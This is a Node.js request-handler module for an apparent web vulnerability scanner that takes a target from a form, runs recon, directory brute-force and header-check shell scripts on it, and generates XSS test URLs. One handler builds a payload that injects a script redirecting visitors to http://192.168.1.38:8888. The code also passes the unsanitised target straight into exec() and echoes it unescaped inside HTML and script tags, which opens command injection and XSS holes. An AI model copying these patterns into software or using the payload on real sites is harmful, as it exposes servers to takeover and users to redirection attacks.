var querystring = require("querystring");var fs = require('fs');function start(request, response, postData) {	var  scan_body = require('./static/auth_body');	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + "<h3>Enter a target and wait for some days</h3>" +scan_body.footer);	response.end();}function info(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('bash ./tools/getinfo.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }  	  //console.log(`stdout: ${stdout}`);  	  //console.log(`stderr: ${stderr}`);	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function injections(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('./tools/getparams.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }	console.log(`${stdout}`);	var a = JSON.parse(`${stdout}`);	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+"CONSOLE"+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	console.log(a.DOMEN+'/'+a.ACTIONS[1]+'/?'+a.PARAMS[0]+'=""><script>window.location="http://192.168.1.38:8888"</script>"');	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function badauth(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('./tools/dirbrut.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function xss(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('./tools/checkHeaders.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function direct(request, response, postData) {	var jsdom = require("jsdom");		//Here is the creating of JSON with form parameters		function showForms() {		var forms = document.querySelectorAll('form');		var huckbase = new Array();		huckbase = [];		var params = new Array();		var actions = new Array();		var methods = new Array();		for (var i=0;i<forms.length;i++){			params[i]=[];			for (var j=0;j<forms[i].elements.length;j++){				if(forms[i].elements[j].name)					params[i].push(forms[i].elements[j].name);			}			actions[i]=forms[i].action;			methods[i]=forms[i].method;		}		huckbase.push(actions);		huckbase.push(methods);		huckbase.push(params);		console.log(huckbase);		response.writeHead(200, {"Content-Type": "text/html"});		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+querystring.parse(postData).target+'/'+huckbase[0][0]+'/?'+huckbase[2][0][0]+'="ALERT("XSS")"'+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);		response.end();			}		var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('./tools/getpage.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }	jsdom.env({		file: 'checkingpage.html',		done: function (err, window) {			GLOBAL.window = window;			GLOBAL.document = window.document;			showForms();		}	});	/*response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>'+querystring.parse(postData).target+'</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();*/	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}exports.start = start;exports.info = info;exports.injections = injections;exports.badauth = badauth;exports.xss = xss;exports.direct = direct;  